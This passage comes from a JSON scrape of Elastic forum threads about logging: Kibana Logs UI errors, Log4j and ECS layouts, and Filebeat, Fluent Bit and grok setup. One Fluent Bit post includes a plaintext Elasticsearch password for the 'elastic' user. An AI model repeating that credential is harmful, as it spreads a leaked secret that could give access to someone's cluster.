    "body": "open logs UI - configure to use SourceTime which is in date_nanos instead of @timestamp field, logsUI tries to load data for several seconds, then displays graphics on the left side (timeline), and briefly shows the logs, but almost immediately causes the following error: Invariant Violation: Minified React error #185; visit https://reactjs.org/docs/error-decoder.html?invariant=185 for the full message or use the non-minified dev environment for full errors and additional helpful warnings. at ba (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:315) at x (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:584) at qf (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:96685) at Object.enqueueSetState (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:48105) at DatePicker.E.setState (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:192:1610) at DatePicker.componentDidUpdate (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:184:64661) at Vh (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:85102) at Zh (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:86620) at http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:200:99742 at Object.exports.unstable_runWithPriority (http://somehost:5601/built_assets/dlls/vendors.bundle.dll.js:151:3314)",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bf5c67c2-3fbe-42dd-a74b-d1bfdf07200c",
    "url": "https://discuss.elastic.co/t/unifying-log4j-2-layouts-and-ecslayout/197698",
    "title": "Unifying Log4j 2 layouts and EcsLayout",
    "category": [
      "Logs"
    ],
    "author": "vyazici",
    "date": "September 2, 2019, 2:00pm September 2, 2019, 3:46pm September 3, 2019, 9:10am September 3, 2019, 8:00pm September 6, 2019, 12:16pm September 9, 2019, 9:22am October 4, 2019, 12:56pm October 7, 2019, 6:41am October 10, 2019, 11:07am November 7, 2019, 11:21am",
    "body": "Dear fellow Elastic developers, I am the maintainer of the log4j2-logstash-layout project, the fastest and the only fully customizable JSON layout plugin for Log4j 2: LogstashLayout. A couple of days ago (2019-08-30) Felix Barnsteiner from Elastic announced a new project: java-ecs-logging. This is great news for the Java world since the development gap between the code and getting your logs stashed to Elasticsearch is closing even more. java-ecs-logging transforms Log4j1/Log4j2/Logback LogEvent's into JSON strings compatible with the Elastic Common Schema (ECS). That said, I find the re-invention of yet another Log4j 2 JSON layout (EcsLayout) partly sad and disappointing for a couple of reasons: LogstashLayout is already a battle-tested well-established solution used by hundreds of companies around the world. LogstashLayout has been enhanced with many feature requests/PRs provided by its users. Its design and existence does not emanate from hypothetical uses cases. LogstashLayout supports way more features and allows full schema customization where none is available in EcsLayout. One can perfectly support ECS in LogstashLayout by just changing the JSON schema, no plugin/software update is needed. Now there are 3 contenders in the market: JSONLayout, LogstashLayout, and EcsLayout. I have briefly benchmarked EcsLayout and LogstashLayout and observed that EcsLayout is ~0.5X faster for lite LogEvents and LogstashLayout is faster ~10X faster for full (stack trace, MDC, NDC, etc.) LogEvents. In each case LogstashLayout showed the lowest GC load. That said, do you really need something faster given LogstashLayout can render 793,597 LogEvent/sec on a single core? (I will share my findings once java-ecs-logging publishes an artifact to Maven Central.) EcsLayout doesn't have any dependencies. LogstashLayout depends on Jackson, though provides a fat JAR artifact along with every release. I would like to kindly ask you to consider a unifying approach rather than deprecating existing solutions with inferior new alternatives. Rather than coming up with a new Log4j 2 layout, IMHO, java-ecs-logging could have chosen (and can still chose!) one of the following paths: Contributing to LogstashLayout for the missing features, if there is any Using LogstashLayout within the project Relaying the Log4j 2 user base to LogstashLayout I would really appreciate a solution that would benefit both Elastic and its existing Log4j 2 users. I am open to any kind of collaboration along this direction and will be looking forward for your response. Best.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "1ab4b8ff-85df-4052-b517-a19bed04cad2",
    "url": "https://discuss.elastic.co/t/how-to-esclude-from-filebeat-this-log/202303",
    "title": "How to esclude from filebeat this log",
    "category": [
      "Logs"
    ],
    "author": "mirketto82",
    "date": "October 4, 2019, 8:31am October 6, 2019, 12:52pm October 7, 2019, 10:11am October 7, 2019, 11:08am November 4, 2019, 11:09am",
    "body": "hi all i want to exclude from filebeat this logs? at org.apache.camel.spring.spi.TransactionErrorHandler.process(TransactionErrorHandler.java:101) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler.process(TransactionErrorHandler.java:114) Oct 4, 2019 @ 10:27:45 at org.apache.camel.processor.RedeliveryErrorHandler.process(RedeliveryErrorHandler.java:542) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler.processByErrorHandler(TransactionErrorHandler.java:220) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler.doInTransactionTemplate(TransactionErrorHandler.java:176) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler.processInTransaction(TransactionErrorHandler.java:136) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler.process(TransactionErrorHandler.java:114) Oct 4, 2019 @ 10:27:45 at org.apache.camel.processor.CamelInternalProcessor.process(CamelInternalProcessor.java:197) Oct 4, 2019 @ 10:27:45 at org.apache.camel.processor.CamelInternalProcessor.process(CamelInternalProcessor.java:172) Oct 4, 2019 @ 10:27:45 at org.apache.camel.processor.RedeliveryErrorHandler.process(RedeliveryErrorHandler.java:542) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler.processByErrorHandler(TransactionErrorHandler.java:220) Oct 4, 2019 @ 10:27:45 at org.apache.camel.spring.spi.TransactionErrorHandler$1.doInTransactionWithoutResult(TransactionErrorHandler.java:183) Oct 4, 2019 @ 10:27:45 at org.springframework.transaction.support.TransactionCallbackWithoutResult.doInTransaction(TransactionCallbackWithoutResult.java:3 can you help me?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "fa443347-ff14-4db4-9cc5-b19d8528f808",
    "url": "https://discuss.elastic.co/t/java-ecs-logging/201266",
    "title": "Java-ecs-logging",
    "category": [
      "Logs"
    ],
    "author": "Rem",
    "date": "September 27, 2019, 8:30am September 26, 2019, 5:06pm September 27, 2019, 8:29am September 27, 2019, 3:49pm September 30, 2019, 6:49pm September 30, 2019, 7:02pm October 1, 2019, 10:21am October 29, 2019, 10:21am",
    "body": "Hi, Hope there is someone that can help me. Config.xml for Log4j2 : <Console name=\"LogToConsole\" target=\"SYSTEM_OUT\"> <Appenders> <Console name=\"LogToConsole\" target=\"SYSTEM_OUT\"> <EcsLayout> <KeyValuePair key=\"additionalField1\" value=\"constant value\"/> <KeyValuePair key=\"typeFromStructMsg\" value=\"${sd:msg}\"/> <KeyValuePair key=\"nameFromMapMsg\" value=\"${map:name}\"/> <KeyValuePair key=\"nameFromContext\" value=\"${ctx:test}\"/> <KeyValuePair key=\"mySysProperty\" value=\"${sys:mySysProperty}\"/> </EcsLayout> </Console> </Appenders> <Loggers> <Root> <AppenderRef ref=\"LogToConsole\" /> </Root> </Loggers> </Configuration> When I add value in a Map or in the ThreadContext, I always get \"labels.name\" or \"labels.test\" but I need the fields to be at the base of my Elastic Common Schema (ECS). How can I do it and is it thread safe? Thank you! Example of code : StringMapMessage mapMsg = new StringMapMessage(); mapMsg.put(\"name\", \"arun\"); logger.warn(mapMsg); or ThreadContext.put(\"test\", \"test\"); logger.info(\"any message\"); using this open source project : https://github.com/elastic/java-ecs-logging",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "10f11144-370f-4d25-992e-3d50e0e4dd7a",
    "url": "https://discuss.elastic.co/t/log-parsing-in-logstash/201313",
    "title": "Log parsing in logstash",
    "category": [
      "Logs"
    ],
    "author": "sk545",
    "date": "September 26, 2019, 9:17pm September 27, 2019, 11:07am September 27, 2019, 1:35pm September 27, 2019, 10:31pm October 25, 2019, 10:31pm",
    "body": "I am wondering , how can i parse below sample event into relevant fields in logstash ?currently i am not seeing any fields from this log in Kibana UI {\"COMPILATION_TIME\":40,\"DATABASE_ID\":19,\"DATABASE_NAME\":\"EEERD\",\"END_TIME\":\"2019-09-25 07:19:22.397 -0400\",\"EXECUTION_STATUS\":\"SUCCESS\",\"EXECUTION_TIME\":13,\"INBOUND_DATA_TRANSFER_BYTES\":0,\"OUTBOUND_DATA_TRANSFER_BYTES\":0,\"QUERY_ID\":\"018f1f27-030c-c5e0-0000-18a11974c28e\",\"QUERY_TAG\":\"\",\"QUERY_TEXT\":\"GRANT REFERENCES ON EEERD.WS_EDT_DATA_DEV.EDTCNTLPORTCYCBLZTMP3 to role EEER_DB_CATALOG;\",\"QUERY_TYPE\":\"GRANT\",\"QUEUED_OVERLOAD_TIME\":0,\"QUEUED_PROVISIONING_TIME\":0,\"QUEUED_REPAIR_TIME\":0,\"ROLE_NAME\":\"EEER_DB_DEPLOY\",\"SCHEMA_NAME\":\"INFORMATION_SCHEMA\",\"SESSION_ID\":27079812049690,\"START_TIME\":\"2019-09-25 07:19:22.314 -0400\",\"TOTAL_ELAPSED_TIME\":83,\"TRANSACTION_BLOCKED_TIME\":0,\"USER_NAME\":\"ABCZXGT\",\"WAREHOUSE_ID\":49,\"WAREHOUSE_NAME\":\"RE_TY_USER_RRR_WH\"}",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "415b6bb2-291c-425b-842a-29351f1fd745",
    "url": "https://discuss.elastic.co/t/parse-syslog-ng-log-to-elasticsearch/197830",
    "title": "Parse syslog-ng log to elasticsearch",
    "category": [
      "Logs"
    ],
    "author": "ravipemmasani",
    "date": "September 3, 2019, 11:12am September 4, 2019, 6:27am September 4, 2019, 8:49am October 2, 2019, 8:49am",
    "body": "Hi All, Iam glad to join this group. Basically i'm in the midst of setting up POC for centralize log collection and analyse the log. Following is my setup on RHEL 7.6. Syslog-ng-collect log from remote clients Elasticsearch Kibana Need your help to provide sample config file to parse syslog-ng log to elasticsearch and create index pattern,really appreciate your help. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a6001542-610e-4552-ab7d-62821b6af100",
    "url": "https://discuss.elastic.co/t/filebeats-not-working-in-7-x-and-front-end-app-logging/197240",
    "title": "Filebeats not working in 7.x, and front end app logging",
    "category": [
      "Logs"
    ],
    "author": "ngg971",
    "date": "August 28, 2019, 11:42pm August 30, 2019, 9:22am September 27, 2019, 9:22am",
    "body": "Hi, I’ve been using the ELK stack to capture our logs from our Kubernetes cluster. I had filebeats setup on the cluster and everything was working fine until I updated from 6.7 to 7.3 (I also updated the docker image that the filebeat DaemonSet was pulling from). When I initially made the update, all the logs ended up being pushed into one index, whereas before they were split by day and namespace. This is the configuration I have for the output to Elasticsearch and the index template: output.elasticsearch: hosts: ['<url>'] index: \"filebeat-%{[kubernetes.namespace]:default}-%{[agent.version]}-%{+yyyy.MM.dd}\" setup.template: name: \"filebeat-%{[kubernetes.namespace]:default}\" pattern: \"filebeat-%{[kubernetes.namespace]:default}-*\" However since then, the logs have stopped showing up all together, including in the newly created log index. I've searched and haven't found any other indices that match the index pattern filebeat-*. I can’t see any errors in the Daemonset logs on Kubernetes so I’m wondering where the output is getting dumped? As it is clearly not following the configuration above. On a separate note, what would be the easiest way to send logs from a React webapp into Elastic? Currently we are sending them to Sentry using POST requests. If we were to use filebeats, I assume the only way would be to store the logs locally, setup FB locally and have it read from them, or to send them over a UDP/TCP web socket and have FB read from there? I've seen other implementations that use Logstash as an intermediate but would rather not have to set it up for now. Thanks, Nathanael",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f100857f-cd22-4ec3-99eb-ff6f902ebf40",
    "url": "https://discuss.elastic.co/t/how-i-can-send-logs-from-filebeat-to-elasticsearch-in-another-gke/193372",
    "title": "How I can send logs from filebeat to Elasticsearch in another GKE",
    "category": [
      "Logs"
    ],
    "author": "David_Oceans",
    "date": "August 1, 2019, 3:55pm August 8, 2019, 11:27am September 5, 2019, 11:27am",
    "body": "Hi! I have two GKE clusters in different GCP projects. GKE clusters: 1) GKE-ELASTIC (with kibana and elastic) 2) GKE-APPS (with my microservices) In the GKE-APPs I disabled the gke logging, because I want to redirect all logging to my \"external\"/dedicated gke-elastic. For that I installed the fluent-bit. Step: helm install --name fluentbit stable/fluent-bit I guest its the only thing I need to install in my GKE-Apps cluster right? but the point is find the right setup for the backend. backend: type: es es: host: 10.148.0.242 port: 9200 index: kubernetes_cluster type: flb_type logstash_prefix: kubernetes_cluster replace_dots: \"On\" time_key: \"@timestamp\" http_user: \"elastic\" http_passwd: \"vt8sv2zhrr2nbpkdgh422flc\" tls: \"off\" tls_verify: \"on\" tls_ca: \"\" tls_debug: 1 I try with the service name, with the clusterIP, but nothing... The error always is like that [2019/08/01 15:36:17] [ info] [filter_kube] API server connectivity OK [2019/08/01 15:36:17] [ info] [sp] stream processor started [2019/08/01 15:36:18] [error] [http_client] broken connection to 10.148.0.242:9200 ? [2019/08/01 15:36:18] [ warn] [out_es] http_do=-1 URI=/_bulk [2019/08/01 15:36:18] [error] [http_client] broken connection to 10.148.0.242:9200 ? [2019/08/01 15:36:18] [ warn] [out_es] http_do=-1 URI=/_bulk [2019/08/01 15:36:18] [error] [http_client] broken connection to 10.148.0.242:9200 ? Do you know what configuration should I try? Any suggestions will be appreciated! Thank you",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "83ef051d-cd1f-4647-8cd7-4792cca0d8b1",
    "url": "https://discuss.elastic.co/t/multiple-custom-grok-patterns-not-matching-but-they-successfully-match-alone/193175",
    "title": "Multiple custom grok patterns not matching, but they successfully match alone?",
    "category": [
      "Logs"
    ],
    "author": "kmiklas",
    "date": "July 31, 2019, 4:37pm August 5, 2019, 5:51pm August 6, 2019, 1:28pm September 3, 2019, 1:38pm",
    "body": "Grok matches single custom patterns, but does match when custom patterns are combined. Complete, working, an verifiable example Sample data: OK 05/20 20:12:10:067 ABC_02~~DE_02 FGH_IJK jsmith _A0011 Custom patterns: MMDD [0-1][0-9]/[0-3][0-9] THREAD _W\\w+ They work separately; specifically, this pattern works by itself: %{MMDD:mmdd} // Result { \"mmdd\": [ [ \"05/20\" ] ] } ... and this pattern works by itself: %{THREAD:thread} // Result { \"thread\": [ [ \"_A0011\" ] ] } ..but together, they fail: %{MMDD:mmdd} %{THREAD:keyword} No Matches Puzzling. Tyvm Keith :^) Note that I tried the solution presented in this post, but to no avail: Kibana Grok Debugger Multiple Custom Patterns Kibana Hi Lukas. Currently all I am trying to do is to put more than one custom grok pattern in the debugger. But for the purpose of resolving this issue I will provide you with a screenshot of what I have so far. [image] So as you can see above I have used a custom grok pattern to match the 'Host' section of the log. Below is what I would like to achieve, however I believe my syntax is incorrect in the 'Custom Grok Patterns' section. [image] cheers, G Also testing here: https://grokdebug.herokuapp.com/ Regex Resource: regex101.com Online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript Regex101 allows you to create, debug, test and have your expressions explained for PHP, PCRE, Python, Golang and JavaScript. The website also features a community where you can share useful expressions.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e9173b3a-ec9e-4dc8-8ae7-eb7cffc50f3f",
    "url": "https://discuss.elastic.co/t/filebeat-docker-input/192657",
    "title": "Filebeat docker input",
    "category": [
      "Logs"
    ],
    "author": "mihaijulien",
    "date": "July 29, 2019, 9:27am July 29, 2019, 9:29am July 31, 2019, 9:15am August 1, 2019, 8:21am August 1, 2019, 8:21am August 29, 2019, 8:21am",
    "body": "Hello, I have the following filebeat.yml file: filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false #================================ Logging ====================================== logging.level: debug logging.to_files: true logging.files: path: /var/log/filebeat name: filebeat keepfiles: 7 permissions: 0644 #----------------------------- Filebeat inputs -------------------------------- filebeat.inputs: - type: docker containers.ids: - \"*\" # - type: log # enabled: true # paths: # - '/var/lib/docker/containers/*/*.log' #----------------------------- Logstash output -------------------------------- output.logstash: hosts: [\"logstash:5044\"] There is nothing forwarded to logstash. A previous input that worked fine looked like this: filebeat.inputs: - type: log enabled: true paths: - /usr/share/filebeat/logs/server.log Nothing seems to work when is use type: docker in the input. The filebeat log looks like this: 2019-07-29T09:24:24.982Z INFO log/input.go:138 Configured paths: [/var/lib/docker/containers/*/*.log] 2019-07-29T09:24:24.982Z INFO input/input.go:114 Starting input of type: docker; ID: 8760737756938806393 2019-07-29T09:24:24.982Z DEBUG [cfgfile] cfgfile/reload.go:118 Checking module configs from: /usr/share/filebeat/modules.d/*.yml 2019-07-29T09:24:24.983Z DEBUG [input] log/input.go:174 Start next scan 2019-07-29T09:24:24.983Z DEBUG [cfgfile] cfgfile/reload.go:132 Number of module configs found: 0 2019-07-29T09:24:24.983Z INFO crawler/crawler.go:106 Loading and starting Inputs completed. Enabled inputs: 1 2019-07-29T09:24:24.983Z INFO cfgfile/reload.go:150 Config reloader started 2019-07-29T09:24:24.983Z DEBUG [input] log/input.go:195 input states cleaned up. Before: 0, After: 0, Pending: 0 2019-07-29T09:24:24.983Z DEBUG [cfgfile] cfgfile/reload.go:176 Scan for new config files 2019-07-29T09:24:24.983Z DEBUG [cfgfile] cfgfile/reload.go:195 Number of module configs found: 0 2019-07-29T09:24:24.983Z DEBUG [reload] cfgfile/list.go:62 Starting reload procedure, current runners: 0 2019-07-29T09:24:24.983Z DEBUG [reload] cfgfile/list.go:80 Start list: 0, Stop list: 0 2019-07-29T09:24:24.983Z INFO cfgfile/reload.go:205 Loading of config files completed. 2019-07-29T09:24:34.983Z DEBUG [input] input/input.go:152 Run input 2019-07-29T09:24:34.983Z DEBUG [input] log/input.go:174 Start next scan 2019-07-29T09:24:34.983Z DEBUG [input] log/input.go:195 input states cleaned up. Before: 0, After: 0, Pending: 0",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "46f86f0c-9fe4-4fb1-aa3e-972a18a90ba4",
    "url": "https://discuss.elastic.co/t/log4net-implemenation-with-elastic-stack-7-2/191508",
    "title": "Log4net implemenation with elastic stack 7.2",
    "category": [
      "Logs"
    ],
    "author": "herzel",
    "date": "July 21, 2019, 8:42am July 22, 2019, 9:03am July 23, 2019, 11:10am August 20, 2019, 11:10am",
    "body": "Hi. Thanks a lot in advance for any reply. I have mission from my boss to apply elastic stack 7.2 with log4net. can not find any howto in the web. can anyone help with this issue. I need howto that will explain howto collect logs from log4net source pipeline through logstash over into redirecting the pipeline into elastic DB and there to be able to index the data. seems any help will be greatly appreciate.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "eceef1b4-3847-4fc3-86ad-790f719fb35a",
    "url": "https://discuss.elastic.co/t/grok-pattern-content-management/188162",
    "title": "Grok pattern / content management",
    "category": [
      "Logs"
    ],
    "author": "thedude",
    "date": "June 30, 2019, 1:32am June 30, 2019, 1:46am July 28, 2019, 1:47am",
    "body": "Is there any ability in the platform today to build out grok patterns within the UI and distribute them to filebeats agents or push these into updated logstash pipelines? If not, could this be a feature request? Would be neat to interactively build out grok patterns in the UI, and distribute to various collectors/processors with a single click.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1d05183b-533f-4e82-9e94-8664cd39eb15",
    "url": "https://discuss.elastic.co/t/upload-my-logs-from-node-to-elasticsearch/187003",
    "title": "Upload my logs from node to ElasticSearch",
    "category": [
      "Logs"
    ],
    "author": "Shahar-Y",
    "date": "June 23, 2019, 11:43am June 23, 2019, 11:54am June 24, 2019, 10:25am June 25, 2019, 6:33am July 22, 2019, 5:56pm",
    "body": "Hi, I'm new to ElasticSearch. I want my application to upload its logs while it's running - to my ElasticSearch server. My application is using node (typescript), and I can't understand how to upload a JSON log I created to the server. Do I have to create my own log file and only then send it to the ES server? Please help",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3dc1e040-dce1-4071-abd9-8ace1e819037",
    "url": "https://discuss.elastic.co/t/support-multiple-sources/184117",
    "title": "Support multiple sources",
    "category": [
      "Logs"
    ],
    "author": "tomeri",
    "date": "June 4, 2019, 8:41am June 4, 2019, 9:00am July 2, 2019, 9:00am",
    "body": "Hi, I don't know if this already implemented, but I think it'll be helpful to add an option for configuring multiple sources then display them as a dropdown for quick navigation between the different sources without the need of re-editing the current source every time. I use Kibana 6.7.1 Thanks,",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b4b2cf96-d08c-4711-aefb-5007ef52d388",
    "url": "https://discuss.elastic.co/t/kibana-logs-are-not-in-order-6-7-version/181887",
    "title": "Kibana logs are not in order 6.7 version",
    "category": [
      "Logs"
    ],
    "author": "Rampsrr",
    "date": "May 28, 2019, 1:41am May 28, 2019, 12:57pm June 25, 2019, 1:07pm",
    "body": "Filebeat-- logstash - - elastic search - - kibana Version all 6.7 It is not working both scenario #10005 ticket, since in real time i have more log lines of 10 to 15 have same @timestamp with respective to seconds but offset different, so i have created new number filed in logstash with combined @timestamp and offset together... After that In kibana discover tab i can able to see the new number field with unique number.. But in kibana logs ui, it stopped streaming if i try to order by newly created number field. Or Any possibility to combine @timestamp, offset in kibana logs UI tab.. Because i tried multiple combination but failed.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "40bd3700-9a18-4233-a1b1-8a28f66b8252",
    "url": "https://discuss.elastic.co/t/configure-multiple-servers-logs-into-single-kibana-dashboard/180931",
    "title": "Configure multiple servers logs into single kibana dashboard",
    "category": [
      "Logs"
    ],
    "author": "pavansai",
    "date": "May 14, 2019, 6:59am May 14, 2019, 7:32am May 14, 2019, 9:08am May 14, 2019, 10:59am May 14, 2019, 11:42am May 14, 2019, 12:10pm May 15, 2019, 5:46am May 15, 2019, 5:48am May 15, 2019, 10:28am May 15, 2019, 5:13pm May 15, 2019, 12:17pm May 15, 2019, 5:14pm May 16, 2019, 8:55am May 20, 2019, 6:24am May 20, 2019, 11:32am May 21, 2019, 8:23am June 18, 2019, 8:23am",
    "body": "Please assist how to configure multiple servers logs into single kibana dashboard",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "aed4553c-99d8-4fa5-b459-bd2fcc5a0777",
    "url": "https://discuss.elastic.co/t/logs-ui-along-with-spaces/177212",
    "title": "Logs UI along with spaces",
    "category": [
      "Logs"
    ],
    "author": "sl1729",
    "date": "April 17, 2019, 9:51am April 18, 2019, 3:10pm April 22, 2019, 7:31am April 23, 2019, 8:39am April 24, 2019, 3:31am May 8, 2019, 2:23pm June 5, 2019, 2:23pm",
    "body": "I created a space called 'dev' and then created objects like index-pattern, visualization and dashboards etc .. And then a role with read permission to that space and read access to the related indexes. Created a user 'dev-user' under that role. But now when I login as admin [navigate to the dev space], I am able to view the the logs in Logs UI. But when login as dev-user [navigate to the dev space], I am only seeing message \" Looks like you don't have any metrics indices.\". Even though I am able to view the dashboards without problem with all visualizations. How can I provide dev-user access to view the logs in Logs-UI ?.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "48eba557-43ea-4d87-a28f-503f4e4ff0ad",
    "url": "https://discuss.elastic.co/t/roles-related-to-infra-ui/176129",
    "title": "Roles related to infra UI",
    "category": [
      "Logs"
    ],
    "author": "sl1729",
    "date": "April 10, 2019, 2:58am April 14, 2019, 10:42pm April 15, 2019, 1:50am April 15, 2019, 2:40pm April 17, 2019, 7:21am May 15, 2019, 7:21am",
    "body": "We are experimenting infra UI and logs UI. Going good so far, except few known issues which are getting discussed in forum. But when providing access to the users we are having difficulty. We have a scenario where we need to provide users read access for dashboard and ( logs UI or infra UI ). How can we setup this role and provide user no access to other menus.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "2a1b7073-b7d0-4a47-bbfb-f4cd63c96b7e",
    "url": "https://discuss.elastic.co/t/stream-logs-to-elastic-search-from-fastly/176217",
    "title": "Stream logs to elastic search from Fastly",
    "category": [
      "Logs"
    ],
    "author": "soerenfrisk",
    "date": "April 10, 2019, 12:24pm April 11, 2019, 8:46am April 11, 2019, 10:49am April 12, 2019, 1:38pm May 10, 2019, 1:38pm",
    "body": "I'm trying to find a way to stream logs from fastly.com to an elastic cloud service. According to Fastly's docs you are only able to do this through Logstash (which is not included in the cloud service). It seems impractical to have and manage a logstash instance for receiving logs from one source. Anyone have tried to successfully stream logs from Fastly to Elastic search directly? It seems the only way to stream logs to elastic is through beats.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2e7a3e28-b326-496b-b3ee-c01c28608909",
    "url": "https://discuss.elastic.co/t/capturing-logs-from-a-browser-spa/175159",
    "title": "Capturing logs from a browser (SPA)",
    "category": [
      "Logs"
    ],
    "author": "Matt_Russell",
    "date": "April 3, 2019, 10:13am April 5, 2019, 8:58am May 3, 2019, 9:08am",
    "body": "I wondered if anyone had any good patterns or advice on collecting logs from a single-page application (SPA) running in user browsers and getting them into Elasticsearch? I guess one approach might be to post AJAX to a /logs endpoint on our backend.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fff445e1-c418-48b5-89b8-7ecebaac719f",
    "url": "https://discuss.elastic.co/t/setting-up-logs-functionality-with-fluentd/169923",
    "title": "Setting up logs functionality with fluentd",
    "category": [
      "Logs"
    ],
    "author": "Erik_Tribou",
    "date": "February 26, 2019, 2:48am February 26, 2019, 12:53pm February 26, 2019, 11:13pm March 23, 2019, 9:23am April 3, 2019, 1:07pm May 1, 2019, 1:07pm",
    "body": "I'm using elasticsearch and kibana 6.5.1 and trying to get the logs functionality working with logs we are inserting via fluentd. Unfortunately all I'm getting is message that no logs can be found and to adjust my filter. I'm seeing some action on the timeline at the right hand of the screen, but nothing ever shows when I set logs to start streaming or do searches for messages I know are there. I can see new messages through the discover module of Kibana, but nothing ever shows up in the logs module. Any ideas on what could be wrong with the configuration? Relevant entries from kibana.yml: xpack.infra.sources.default.logAlias: 'fluentd-*' xpack.infra.sources.default.fields.message: ['msg', 'MESSAGE'] xpack.infra.sources.default.fields.host: '_HOSTNAME' xpack.infra.sources.default.fields.container: 'container_name' xpack.infra.sources.default.fields.pod: 'pod_name' xpack.infra.sources.default.fields.tiebreaker: '_SOURCE_REALTIME_TIMESTAMP' An example of the source field (json view in kibana) from one of our records (redacting a few fields): \"_index\": \"fluentd-2019.02.25\", \"_type\": \"fluentd\", \"_id\": \"7lARJ2kBLWoRN3y-8Wpv\", \"_version\": 1, \"_score\": null, \"_source\": { \"PRIORITY\": \"6\", \"_PID\": \"62984\", \"_UID\": \"0\", \"_GID\": \"0\", \"_COMM\": \"dockerd-current\", \"_EXE\": \"/usr/bin/dockerd-current\", \"_CMDLINE\": \"blah blah cmdline\", \"_CAP_EFFECTIVE\": \"1fffffffff\", \"_SYSTEMD_CGROUP\": \"/system.slice/docker.service\", \"_SYSTEMD_UNIT\": \"docker.service\", \"_SYSTEMD_SLICE\": \"system.slice\", \"_BOOT_ID\": \"a4a22bc8790b4ad1a666e4446f60cc06\", \"_MACHINE_ID\": \"955d8fb4b61d4db3ad878e45e9008bcc\", \"_HOSTNAME\": \"blahblah.com\", \"CONTAINER_ID\": \"fd1f537b429f\", \"CONTAINER_ID_FULL\": \"fd1f537b429fb51eca428b60334c93689029b7ed24bbf471f2999b62d013353f\", \"CONTAINER_NAME\": \"blah-blah-container-name\", \"CONTAINER_TAG\": \"\", \"_TRANSPORT\": \"journal\", \"_SELINUX_CONTEXT\": \"system_u:system_r:container_runtime_t:s0\", \"MESSAGE\": \"{\\\"@timestamp\\\":\\\"2019-02-25T15:50:43.046-08:00\\\",\\\"msg\":\\\"Clearing decision cache\\\",\\\"logger_name\\\":\\\"com.blahblah.fraud_analysis.cache.DecisionCacheHolder\\\",\\\"thread_name\\\":\\\"scheduling-1\\\",\\\"level\\\":\\\"INFO\\\",\\\"level_value\\\":20000,\\\"traceId\\\":\\\"2181d65dcf43ebbe\\\",\\\"spanId\\\":\\\"2181d65dcf43ebbe\\\",\\\"spanExportable\\\":\\\"true\\\",\\\"app\\\":\\\"siftscience\\\"}\", \"_SOURCE_REALTIME_TIMESTAMP\": \"1551138643047036\", \"name_prefix\": \"k8s\", \"container_name\": \"sift-science-30162-ce2b1acd\", \"pod_name\": \"sift-science-30162-ce2b1acd-1-z4g36\", \"namespace\": \"sift-science\", \"@timestamp\": \"2019-02-25T15:50:43.046-08:00\", \"msg\": \"Clearing decision cache\", \"logger_name\": \"com.blahblah.fraud_analysis.cache.DecisionCacheHolder\", \"thread_name\": \"scheduling-1\", \"level\": \"INFO\", \"level_value\": 20000, \"traceId\": \"2181d65dcf43ebbe\", \"spanId\": \"2181d65dcf43ebbe\", \"spanExportable\": \"true\", \"app\": \"siftscience\", \"syzygy\": \"syzygy44\" } Attaching what I see in the logs module: image.png1737×1324 166 KB",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "f98cb50b-d35d-4d69-bb1e-4973fb398104",
    "url": "https://discuss.elastic.co/t/sebp-elk-with-pfsense/173576",
    "title": "Sebp/ELK with PFSense",
    "category": [
      "Logs"
    ],
    "author": "stinkfly",
    "date": "March 23, 2019, 5:50am March 26, 2019, 11:09am March 27, 2019, 4:04am March 27, 2019, 11:11am April 2, 2019, 12:03am April 30, 2019, 12:03am",
